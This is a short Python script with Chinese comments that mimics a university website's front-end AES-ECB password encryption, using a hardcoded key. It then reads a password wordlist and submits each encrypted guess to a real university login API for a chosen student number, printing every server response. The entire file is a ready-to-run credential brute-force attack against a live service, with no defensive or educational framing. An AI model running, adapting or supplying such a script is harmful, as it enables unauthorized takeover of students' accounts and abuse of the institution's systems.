from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import urllib.parse
import requests

# AES 加密（和前端完全一样）
def encrypt_password(password):
    # 前端固定密钥
    key = b"rndAgtFzYJpyKlRY"
    
    # 初始化 AES-ECB
    cipher = AES.new(key, AES.MODE_ECB)
    
    # Pkcs7 填充
    padded_pwd = pad(password.encode('utf-8'), AES.block_size)
    
    # 加密
    encrypted = cipher.encrypt(padded_pwd)
    
    # 转 Base64
    base64_str = base64.b64encode(encrypted).decode('utf-8')
    
    # 最后 URL 编码
    final = urllib.parse.quote(base64_str)
    
    return final

login_url = 'https://msapi.mju.edu.cn/basic/user/login/key'
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
username = ''# 请输入学号
password_list=""# 请输入字典路径
schoolId=1
sysNo="2nd_classroom'"

with open(password_list, "r", encoding="utf-8") as f:
    for pwd in f:
        pwd = pwd.strip()
        print(pwd)
        encrypted_pwd = encrypt_password(pwd)
        login_data = {
            "username": username,
            "schoolId": schoolId,
            "sysNo": sysNo,
            "password": encrypted_pwd
        }
        response = requests.post(login_url, data=login_data, headers={"User-Agent": UA})
        print(response.text)

